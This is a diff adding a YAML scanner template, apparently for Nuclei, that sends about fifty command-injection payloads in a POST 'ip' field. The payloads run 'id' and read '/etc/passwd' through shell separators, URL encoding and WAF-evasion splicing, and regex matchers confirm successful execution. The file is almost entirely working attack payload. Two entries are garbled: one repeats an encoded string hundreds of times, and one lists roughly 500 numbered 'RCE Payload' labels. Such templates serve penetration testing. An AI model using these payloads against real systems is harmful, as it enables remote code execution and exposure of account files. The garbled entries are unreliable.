@@ -1,0 +1,96 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - ";system(\"id\")"
+        - ";id|"
+        - "cat /etc/passwd"
+        - "\\nid\\n"
+        - ";cat /e${hahaha}tc/${heywaf}pas${catchthis}swd"
+        - "cat$u /etc/$upasswd"
+        - "%7C%20id"
+        - "id;"
+        - "cat%20/etc/passwd"
+        - ";id\\n"
+        - "%2Csystem%28%27id%27%29"
+        - "%26id"
+        - "%27id%27"
+        - "%26id%26"
+        - "||id"
+        - "|id"
+        - ";cat /etc/passwd"
+        - "%0Aid"
+        - "%7Bcat%2C%2Fetc%2Fpasswd%7D"
+        - "system('cat /etc/passwd');"
+        - ";id"
+        - "%22cat%20/etc/passwd"
+        - "%7C%20id;"
+        - "%24%28%7Bcat%2C%2Fetc%24%7Bhahahaha%7Dpasswd%7D"
+        - "%5Cid%7C"
+        - "& id"
+        - "a;system(\"cat /etc/passwd\");"
+        - "%22id%7C"
+        - "%26cat%20%2Fetc%24u%2Fpasswd%3B"
+        - "cat /etc/passwd"
+        - "cat%20/etc/passwd"
+        - "cat$u /etc$u/passwd$u | sed $u 's/[0-9]//g' "
+        - "%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%26%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%26%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%26%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%26%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%3B%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%3B%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%3B%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%3B%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%24u%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%24u%3B%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%24u%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%24u%3B%26cat%20%2Fetc%24u%24u%24u%24u%24u%24u%26cat%20%2Fetc%24u%24u%24u%24u%24u%3B%26cat%20%2Fetc%24u%24u%24u%24u%26cat%20%2Fetc%24u%24u%24u%3B%26cat%20%2Fetc%24u%24u%26cat%20%2Fetc%24u%3B%26cat%20%2Fetc%26cat%20%2Fetc"
+        - ";id"
+        - ";id"
+        - "; `id` ### RCE Payload 1 ###
+; echo RCE Payload 2 ### RCE Payload 3 ### RCE Payload 4### RCE Payload 5 ### RCE Payload 6 ### RCE Payload 7### RCE Payload 8 ### RCE Payload 9 ### RCE Payload 10 ### RCE Payload 11 ### RCE Payload 12### RCE Payload 13 ### RCE Payload 14 ### RCE Payload 15 ### RCE Payload 16### RCE Payload 17 ### RCE Payload 18 ### RCE Payload 19 ### RCE Payload 20 ### RCE Payload 21 ### RCE Payload 22### RCE Payload 23 ### RCE Payload 24 ### RCE Payload 25 ### RCE Payload 26### RCE Payload 27 ### RCE Payload 28 ### RCE Payload 29 ### RCE Payload 30 ### RCE Payload 31 ### RCE Payload 32### RCE Payload 33 ### RCE Payload 34 ### RCE Payload 35 ### RCE Payload 36### RCE Payload 37 ### RCE Payload 38 ### RCE Payload 39 ### RCE Payload 40 ### RCE Payload 41 ### RCE Payload 42### RCE Payload 43 ### RCE Payload 44 ### RCE Payload 45 ### RCE Payload 46### RCE Payload 47 ### RCE Payload 48 ### RCE Payload 49 ### RCE Payload 50 ### RCE Payload 51 ### RCE Payload 52### RCE Payload 53 ### RCE Payload 54 ### RCE Payload 55 ### RCE Payload 56### RCE Payload 57 ### RCE Payload 58 ### RCE Payload 59 ### RCE Payload 60 ### RCE Payload 61 ### RCE Payload 62### RCE Payload 63 ### RCE Payload 64 ### RCE Payload 65 ### RCE Payload 66### RCE Payload 67 ### RCE Payload 68 ### RCE Payload 69 ### RCE Payload 70 ### RCE Payload 71 ### RCE Payload 72### RCE Payload 73 ### RCE Payload 74 ### RCE Payload 75 ### RCE Payload 76### RCE Payload 77 ### RCE Payload 78 ### RCE Payload 79 ### RCE Payload 80 ### RCE Payload 81 ### RCE Payload 82### RCE Payload 83 ### RCE Payload 84 ### RCE Payload 85 ### RCE Payload 86### RCE Payload 87 ### RCE Payload 88 ### RCE Payload 89 ### RCE Payload 90 ### RCE Payload 91 ### RCE Payload 92### RCE Payload 93 ### RCE Payload 94 ### RCE Payload 95 ### RCE Payload 96### RCE Payload 97 ### RCE Payload 98 ### RCE Payload 99 ### RCE Payload 100 ### RCE Payload 101 ### RCE Payload 102### RCE Payload 103 ### RCE Payload 104 ### RCE Payload 105 ### RCE Payload 106### RCE Payload 107 ### RCE Payload 108 ### RCE Payload 109 ### RCE Payload 110 ### RCE Payload 111 ### RCE Payload 112### RCE Payload 113 ### RCE Payload 114 ### RCE Payload 115 ### RCE Payload 116### RCE Payload 117 ### RCE Payload 118 ### RCE Payload 119 ### RCE Payload 120 ### RCE Payload 121 ### RCE Payload 122### RCE Payload 123 ### RCE Payload 124 ### RCE Payload 125 ### RCE Payload 126### RCE Payload 127 ### RCE Payload 128 ### RCE Payload 129 ### RCE Payload 130 ### RCE Payload 131 ### RCE Payload 132### RCE Payload 133 ### RCE Payload 134 ### RCE Payload 135 ### RCE Payload 136### RCE Payload 137 ### RCE Payload 138 ### RCE Payload 139 ### RCE Payload 140 ### RCE Payload 141 ### RCE Payload 142### RCE Payload 143 ### RCE Payload 144 ### RCE Payload 145 ### RCE Payload 146### RCE Payload 147 ### RCE Payload 148 ### RCE Payload 149 ### RCE Payload 150 ### RCE Payload 151 ### RCE Payload 152### RCE Payload 153 ### RCE Payload 154 ### RCE Payload 155 ### RCE Payload 156### RCE Payload 157 ### RCE Payload 158 ### RCE Payload 159 ### RCE Payload 160 ### RCE Payload 161 ### RCE Payload 162### RCE Payload 163 ### RCE Payload 164 ### RCE Payload 165 ### RCE Payload 166### RCE Payload 167 ### RCE Payload 168 ### RCE Payload 169 ### RCE Payload 170 ### RCE Payload 171 ### RCE Payload 172### RCE Payload 173 ### RCE Payload 174 ### RCE Payload 175 ### RCE Payload 176### RCE Payload 177 ### RCE Payload 178 ### RCE Payload 179 ### RCE Payload 180 ### RCE Payload 181 ### RCE Payload 182### RCE Payload 183 ### RCE Payload 184 ### RCE Payload 185 ### RCE Payload 186### RCE Payload 187 ### RCE Payload 188 ### RCE Payload 189 ### RCE Payload 190 ### RCE Payload 191 ### RCE Payload 192### RCE Payload 193 ### RCE Payload 194 ### RCE Payload 195 ### RCE Payload 196### RCE Payload 197 ### RCE Payload 198 ### RCE Payload 199 ### RCE Payload 200 ### RCE Payload 201 ### RCE Payload 202### RCE Payload 203 ### RCE Payload 204 ### RCE Payload 205 ### RCE Payload 206### RCE Payload 207 ### RCE Payload 208 ### RCE Payload 209 ### RCE Payload 210 ### RCE Payload 211 ### RCE Payload 212### RCE Payload 213 ### RCE Payload 214 ### RCE Payload 215 ### RCE Payload 216### RCE Payload 217 ### RCE Payload 218 ### RCE Payload 219 ### RCE Payload 220 ### RCE Payload 221 ### RCE Payload 222### RCE Payload 223 ### RCE Payload 224 ### RCE Payload 225 ### RCE Payload 226### RCE Payload 227 ### RCE Payload 228 ### RCE Payload 229 ### RCE Payload 230 ### RCE Payload 231 ### RCE Payload 232### RCE Payload 233 ### RCE Payload 234 ### RCE Payload 235 ### RCE Payload 236### RCE Payload 237 ### RCE Payload 238 ### RCE Payload 239 ### RCE Payload 240 ### RCE Payload 241 ### RCE Payload 242### RCE Payload 243 ### RCE Payload 244 ### RCE Payload 245 ### RCE Payload 246### RCE Payload 247 ### RCE Payload 248 ### RCE Payload 249 ### RCE Payload 250 ### RCE Payload 251 ### RCE Payload 252### RCE Payload 253 ### RCE Payload 254 ### RCE Payload 255 ### RCE Payload 256### RCE Payload 257 ### RCE Payload 258 ### RCE Payload 259 ### RCE Payload 260 ### RCE Payload 261 ### RCE Payload 262### RCE Payload 263 ### RCE Payload 264 ### RCE Payload 265 ### RCE Payload 266### RCE Payload 267 ### RCE Payload 268 ### RCE Payload 269 ### RCE Payload 270 ### RCE Payload 271 ### RCE Payload 272### RCE Payload 273 ### RCE Payload 274 ### RCE Payload 275 ### RCE Payload 276### RCE Payload 277 ### RCE Payload 278 ### RCE Payload 279 ### RCE Payload 280 ### RCE Payload 281 ### RCE Payload 282### RCE Payload 283 ### RCE Payload 284 ### RCE Payload 285 ### RCE Payload 286### RCE Payload 287 ### RCE Payload 288 ### RCE Payload 289 ### RCE Payload 290 ### RCE Payload 291 ### RCE Payload 292### RCE Payload 293 ### RCE Payload 294 ### RCE Payload 295 ### RCE Payload 296### RCE Payload 297 ### RCE Payload 298 ### RCE Payload 299 ### RCE Payload 300### RCE Payload 301 ### RCE Payload 302 ### RCE Payload 303 ### RCE Payload 304### RCE Payload 305 ### RCE Payload 306 ### RCE Payload 307 ### RCE Payload 308 ### RCE Payload 309 ### RCE Payload 310### RCE Payload 311 ### RCE Payload 312 ### RCE Payload 313 ### RCE Payload 314### RCE Payload 315 ### RCE Payload 316 ### RCE Payload 317 ### RCE Payload 318 ### RCE Payload 319 ### RCE Payload 320### RCE Payload 321 ### RCE Payload 322 ### RCE Payload 323 ### RCE Payload 324### RCE Payload 325 ### RCE Payload 326 ### RCE Payload 327 ### RCE Payload 328### RCE Payload 329 ### RCE Payload 330 ### RCE Payload 331 ### RCE Payload 332### RCE Payload 333 ### RCE Payload 334 ### RCE Payload 335 ### RCE Payload 336### RCE Payload 337 ### RCE Payload 338 ### RCE Payload 339 ### RCE Payload 340 ### RCE Payload 341 ### RCE Payload 342### RCE Payload 343 ### RCE Payload 344 ### RCE Payload 345 ### RCE Payload 346### RCE Payload 347 ### RCE Payload 348 ### RCE Payload 349 ### RCE Payload 350 ### RCE Payload 351 ### RCE Payload 352### RCE Payload 353 ### RCE Payload 354 ### RCE Payload 355 ### RCE Payload 356### RCE Payload 357 ### RCE Payload 358 ### RCE Payload 359 ### RCE Payload 360 ### RCE Payload 361 ### RCE Payload 362### RCE Payload 363 ### RCE Payload 364 ### RCE Payload 365 ### RCE Payload 366### RCE Payload 367 ### RCE Payload 368 ### RCE Payload 369 ### RCE Payload 370 ### RCE Payload 371 ### RCE Payload 372### RCE Payload 373 ### RCE Payload 374 ### RCE Payload 375 ### RCE Payload 376### RCE Payload 377 ### RCE Payload 378 ### RCE Payload 379 ### RCE Payload 380 ### RCE Payload 381 ### RCE Payload 382### RCE Payload 383 ### RCE Payload 384 ### RCE Payload 385 ### RCE Payload 386### RCE Payload 387 ### RCE Payload 388 ### RCE Payload 389 ### RCE Payload 390 ### RCE Payload 391 ### RCE Payload 392### RCE Payload 393 ### RCE Payload 394 ### RCE Payload 395 ### RCE Payload 396### RCE Payload 397 ### RCE Payload 398 ### RCE Payload 399 ### RCE Payload 400 ### RCE Payload 401 ### RCE Payload 402### RCE Payload 403 ### RCE Payload 404 ### RCE Payload 405 ### RCE Payload 406### RCE Payload 407 ### RCE Payload 408 ### RCE Payload 409 ### RCE Payload 410 ### RCE Payload 411 ### RCE Payload 412### RCE Payload 413 ### RCE Payload 414 ### RCE Payload 415 ### RCE Payload 416### RCE Payload 417 ### RCE Payload 418 ### RCE Payload 419 ### RCE Payload 420 ### RCE Payload 421 ### RCE Payload 422### RCE Payload 423 ### RCE Payload 424 ### RCE Payload 425 ### RCE Payload 426### RCE Payload 427 ### RCE Payload 428 ### RCE Payload 429 ### RCE Payload 430 ### RCE Payload 431 ### RCE Payload 432### RCE Payload 433 ### RCE Payload 434 ### RCE Payload 435 ### RCE Payload 436### RCE Payload 437 ### RCE Payload 438 ### RCE Payload 439 ### RCE Payload 440 ### RCE Payload 441 ### RCE Payload 442### RCE Payload 443 ### RCE Payload 444 ### RCE Payload 445 ### RCE Payload 446### RCE Payload 447 ### RCE Payload 448 ### RCE Payload 449 ### RCE Payload 450 ### RCE Payload 451 ### RCE Payload 452### RCE Payload 453 ### RCE Payload 454 ### RCE Payload 455 ### RCE Payload 456### RCE Payload 457 ### RCE Payload 458 ### RCE Payload 459 ### RCE Payload 460 ### RCE Payload 461 ### RCE Payload 462### RCE Payload 463 ### RCE Payload 464 ### RCE Payload 465 ### RCE Payload 466### RCE Payload 467 ### RCE Payload 468 ### RCE Payload 469 ### RCE Payload 470 ### RCE Payload 471 ### RCE Payload 472### RCE Payload 473 ### RCE Payload 474 ### RCE Payload 475 ### RCE Payload 476### RCE Payload 477 ### RCE Payload 478 ### RCE Payload 479 ### RCE Payload 480 ### RCE Payload 481 ### RCE Payload 482### RCE Payload 483 ### RCE Payload 484 ### RCE Payload 485 ### RCE Payload 486### RCE Payload 487 ### RCE Payload 488 ### RCE Payload 489 ### RCE Payload 490 ### RCE Payload 491 ### RCE Payload 492### RCE Payload 493 ### RCE Payload 494 ### RCE Payload 495 ### RCE Payload 496### RCE Payload 497 ### RCE Payload 498 ### RCE Payload 499 ###"
+        - "; system('id');"
+        - "%28%7Bsystem%28%22id%22%29%7D%29"
+        - "### RCE Payload list ###\\n\\nid\\n\\nuname -a\\n\\n${@cat$u${@/etc$u${@passwd$u}}"
+        - "id;"
+        - "cat /e${u}tc/${u}pas${u}swd"
+        - "%5Eid"
+        - ";id"
+        - ";cat+/etc/passwd"
+        - "cat /etc/passwd"
+        - ";id"
+        - "%7Ccat%20%2Fetc%24%2Fpasswd"
+        - "%5Cid%7C%7Ccat%2B%24u%2Fetc%2Fpasswd"
+        - "\\n| id\\n;"
+        - ";cat%20/etc/passwd"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
